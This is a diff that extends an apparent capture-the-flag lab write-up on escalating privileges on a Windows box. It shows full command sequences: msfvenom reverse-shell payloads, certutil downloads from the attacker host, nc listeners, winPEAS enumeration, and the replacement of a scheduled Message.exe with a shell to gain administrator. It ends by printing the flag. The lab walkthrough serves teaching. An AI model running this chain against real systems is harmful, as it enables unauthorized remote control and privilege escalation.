@@ -154,7 +154,9 @@ To exploit this, we need to start a listener, set the TcpClient address and port
  iis apppool\blog
 ``` 
 
-### Meterpreter
+### Privilege Escalation
+
+#### Meterpreter
 
 Now to set up a meterpreter shell to make privilege escalation easier.
 
@@ -213,7 +215,212 @@ msf6 exploit(multi/handler) > run
 meterpreter > 
 ```
 
-### Privilege Escalation
+Now simply run `getsystem` to elevate, then traverse the system to find the flags.
+
+```
+meterpreter > getsystem
+```
+
+```
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+#### Without Meterpreter
+
+First we want to establish a more stable shell. We can do that using `msfvenom`:
+
+```sh
+$ msfvenom -p windows/shell_reverse_tcp x86 LHOST=10.18.57.77 LPORT=4444 -f exe -o stable-shell.exe
+```
+
+Then we want to set up a listener to catch the shell, and a python server and transfer the file to the vulnerable system:
+
+##### Attack Machine
+
+```sh
+$ python3 -m http.server 80
+```
+```sh
+$ nc -lvnp 4444
+```
+
+##### Vulnerable Machine
+
+We can use `certutil` to get the `.exe` file.
+
+```
+c:\Temp> certutil -urlcache -f http://LOCAL_IP/stable-shell.exe stable-shell.exe
+c:\temp>dir
+ Volume in drive C has no label.
+  Volume Serial Number is 0E97-C552
+	 Directory of c:\temp
+	 10/01/2022  08:35 PM    <DIR>          .
+	 10/01/2022  08:35 PM    <DIR>          ..
+	 10/01/2022  08:35 PM            73,802 stable-shell.exe
+	                1 File(s)         73,802 bytes
+									               2 Dir(s)  39,132,266,496 bytes free
+```
+
+Then run it.
+
+```
+stable-shell.exe
+c:\temp>stable-shell.exe
+```
+
+And we have our stable shell!
+
+```sh
+$ nc -lvnp 4444                                         9m 35s 08:37:20 PM
+listening on [any] 4444 ...
+connect to [10.18.57.77] from (UNKNOWN) [10.10.6.19] 49228
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+c:\temp>
+```
+
+##### winPEAS
+
+Now we can enumerate the machine using [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe). We will keep our server on and transfer the `winPEASx64.exe` file to our vulnerable system.
+
+```
+c:\Temp>certutil -urlcache -f http://LOCAL_IP/winPEAS.bat winPEAS.bat
+certutil -urlcache -f http://10.18.57.77/winPEASx64.exe winPEASx64.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+c:\Temp>dir
+dir
+ Volume in drive C has no label.
+  Volume Serial Number is 0E97-C552
+	
+	 Directory of c:\Temp
+	 
+	 10/01/2022  08:48 PM    <DIR>          .
+	 10/01/2022  08:48 PM    <DIR>          ..
+	 10/01/2022  08:35 PM            73,802 stable-shell.exe
+	 10/01/2022  08:48 PM            35,946 winPEAS.bat
+	                2 File(s)        109,748 bytes
+									               2 Dir(s)  39,131,996,160 bytes free
+```							
+
+Now run winPEASx64.exe using `.\winPEASx64.exe servicesinfo`.
+
+```
+c:\Temp>.\winPEASx64.exe servicesinfo
+
+...
+
+WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
+    File Permissions: Everyone [WriteData/CreateFiles]
+		    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
+				    System Scheduler Service Wrapper
+						
+...					
+```						
+
+We see that there are possibly scheduled processes running in `C:\Program Files (x86)\SystemScheduler`. We can investigate this by navigating to that directory by running `tasklist` and looking at the the logs in `Events`.
+
+```
+c:\Program Files (x86)\SystemScheduler\Events>dir
+dir
+ Volume in drive C has no label.
+  Volume Serial Number is 0E97-C552
+	
+	 Directory of c:\Program Files (x86)\SystemScheduler\Events
+	 
+	 10/01/2022  09:13 PM    <DIR>          .
+	 10/01/2022  09:13 PM    <DIR>          ..
+	 10/01/2022  09:14 PM             1,927 20198415519.INI
+	 10/01/2022  09:13 PM            25,645 20198415519.INI_LOG.txt
+	 10/02/2020  02:50 PM               290 2020102145012.INI
+	 10/01/2022  09:06 PM               186 Administrator.flg
+	 10/01/2022  08:15 PM                 0 Scheduler.flg
+	 10/01/2022  09:07 PM                 0 service.flg
+	 10/01/2022  09:06 PM               449 SessionInfo.flg
+	 10/01/2022  09:06 PM               182 SYSTEM_svc.flg
+	                8 File(s)         28,679 bytes
+									               2 Dir(s)  39,128,670,208 bytes free
+																 
+```
+
+Checking the log reveals the scheduled service.
+
+```
+c:\Program Files (x86)\SystemScheduler\Events>type 20198415519.INI_LOG.txt
+type 20198415519.INI_LOG.txt
+
+08/04/19 15:08:00,Event Started Ok, (Administrator)
+08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
+08/04/19 15:09:00,Event Started Ok, (Administrator)
+08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
+08/04/19 15:10:00,Event Started Ok, (Administrator)
+08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
+
+...
+```
+
+Here we notice that `Message.exe` is running every 30 seconds, and since we have write access in this folder, we can the process.
+
+##### Exploit
+
+Now to exploit this, we can set up another listener, create another payload and replace `Message.exe` with our shell.
+
+###### Attack Machine
+
+```sh
+$ msfvenom -p windows/shell_reverse_tcp x86 LHOST=LOCAL_IP LPORT=4445 -f exe -o Message.exe
+```
+
+```sh
+$ nc -lvnp 4445
+```
+###### Vulnerable Machine
+
+**Were not animals!**
+
+```
+c:\Program Files (x86)\SystemScheduler>move Message.exe Message.exe.bak
+move Message.exe Message.exe.bak
+        1 file(s) moved.
+```
+
+Now replace the file with our payload and wait for our shell.
+
+```
+c:\Program Files (x86)\SystemScheduler>certutil -urlcache -f http://LOCAL_IP/Message.exe Message.exe
+```
+
+```
+$ nc -lvnp 4445                                                                                 31m 14s 08:47:23 PM
+ listening on [any] 4445 ...
+ connect to [10.18.57.77] from (UNKNOWN) [10.10.6.19] 49292
+ Microsoft Windows [Version 6.3.9600]
+ (c) 2013 Microsoft Corporation. All rights reserved.
+ 
+ C:\PROGRA~2\SYSTEM~1>
+```
+
+```
+C:\Users\Administrator\Desktop>whoami
+whoami
+hackpark\administrator
+```
+
+##### Flag
+
+```
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+7e13d97f05f7ceb9881a3eb3d78d3e72
+```
+				
+
+
+
+
 
 
 
